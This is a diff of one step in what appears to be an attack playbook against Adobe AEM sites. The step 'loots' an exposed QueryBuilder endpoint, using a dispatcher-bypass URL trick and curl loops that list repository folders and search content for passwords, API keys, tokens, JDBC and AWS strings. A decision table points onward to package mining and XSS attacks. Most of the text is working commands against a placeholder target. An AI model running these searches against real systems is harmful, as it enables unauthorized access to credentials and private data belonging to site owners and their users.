@@ -1,96 +1,93 @@
-# Batch 07 — Loot with a working QueryBuilder URL
+# Batch 07 — Search and loot (QueryBuilder)
 
-## objective
+## GOAL
+With a working search door, pull **high-value paths** and secret keywords. Get leads for batch 08.
 
-With a working `QB` URL (direct or bypass), run a **small set** of high-value searches: content tree, packages path, users, password-ish fulltext. Stop when you have leads for batch 08.
+## TIME
+~1–2 hours
 
-## estimated_time
-
-60–120 minutes
-
-## prerequisites
-
-- Working QueryBuilder (from 03–06)
-- Example:
+## YOU NEED
+- Working `QB` from 03–06
 
 ```bash
-T="https://TARGET"
-QB="$T/bin/querybuilder.json"
-# or: QB="$T/bin/querybuilder.json;x='a/b.css/c'"
+T="https://PUT-THE-SITE-HERE"
+QB="PASTE_WORKING_QUERYBUILDER_BASE_HERE"
+# example: QB="$T/bin/querybuilder.json"
+# example: QB="$T/bin/querybuilder.json;x='a/b.css/c'"
 ```
 
-## testing_workflow
+---
 
-### 1) Technique A — map important roots
+## WHY (30 seconds)
+
+You already opened the search door.  
+Now you use it like a dumb checklist:
+
+1. What folders exist?  
+2. Any word like password?  
+3. Any packages folder?
+
+Do **not** invent fancy queries. Bad guys win by running the same simple searches every time.
+
+---
+
+## DO THIS
+
+### 1) List important folders
 
 ```bash
-for path in /content /content/dam /etc /etc/packages /home /conf /apps /var; do
+for path in /content /content/dam /etc /etc/packages /home /conf; do
   echo "===== $path ====="
   curl -sk -G "$QB" \
     --data-urlencode "path=$path" \
     --data-urlencode "p.limit=10" \
-    -o /tmp/q.json -w "code=%{http_code} size=%{size_download}\n"
-  head -c 220 /tmp/q.json; echo
+    -w "\ncode=%{http_code} bytes=%{size_download}\n" | head -c 350
+  echo
 done
 ```
 
-### 2) Technique B — fulltext for secrets (keep list short)
+### 2) Search scary words (keep this list small)
 
 ```bash
 for term in password secret credential api_key token jdbc aws confidential; do
-  echo "===== fulltext=$term ====="
+  echo "===== $term ====="
   curl -sk -G "$QB" \
     --data-urlencode "path=/content" \
     --data-urlencode "fulltext=$term" \
-    --data-urlencode "p.limit=8" \
-    -o /tmp/q.json -w "code=%{http_code} size=%{size_download}\n"
-  head -c 250 /tmp/q.json; echo
+    --data-urlencode "p.limit=8" | head -c 280
+  echo
 done
 ```
 
-### 3) Technique C — type filters (pages / assets)
+### 3) Forms guide nodes? (for later)
 
 ```bash
 curl -sk -G "$QB" \
-  --data-urlencode "type=cq:Page" \
-  --data-urlencode "path=/content" \
-  --data-urlencode "p.limit=15" -o pages.json
-
-curl -sk -G "$QB" \
-  --data-urlencode "type=dam:Asset" \
-  --data-urlencode "path=/content/dam" \
-  --data-urlencode "p.limit=15" -o assets.json
-
-# guide containers (for Forms later)
-curl -sk -G "$QB" \
   --data-urlencode "property=sling:resourceType" \
   --data-urlencode "property.value=fd/af/components/guideContainer" \
-  --data-urlencode "p.limit=10" -o guides.json
+  --data-urlencode "p.limit=10" | head -c 400; echo
 ```
 
-### 4) Session notes template
+### 4) Write down
 
 ```text
-QB=...
-Open roots: ...
-Secret hits: ...
-Package path present: yes/no
+Open folders:
+Secret hits:
+Packages folder: yes/no
 Guide containers: yes/no
 ```
 
-## decision_points
+---
 
-| If… | Then… |
-|-----|--------|
-| `/etc/packages` lists zips | Next session **08** first |
-| Only `/content` open | Still **08** (content mining) |
-| Empty hits everywhere | ACL tight; try **09–11** XSS/gadgets; keep QB for authenticated tests later |
-| guideContainer found | After 08, jump **12–13** |
+## IF / THEN
 
-## expected_findings
+| What you saw | What you do |
+|--------------|-------------|
+| `/etc/packages` has stuff | **NEXT** now |
+| Only content hits | Still **NEXT** (mine content) |
+| Empty everything | ACL tight → **09** XSS track |
 
-- Path enumeration, PII/docs leads, package paths, user nodes, Forms nodes
+---
 
-## next_batch_to_continue_with
-
-→ **[08-packages-content-secrets.md](./08-packages-content-secrets.md)**
+## NEXT
+→ [08-packages-content-secrets.md](./08-packages-content-secrets.md)
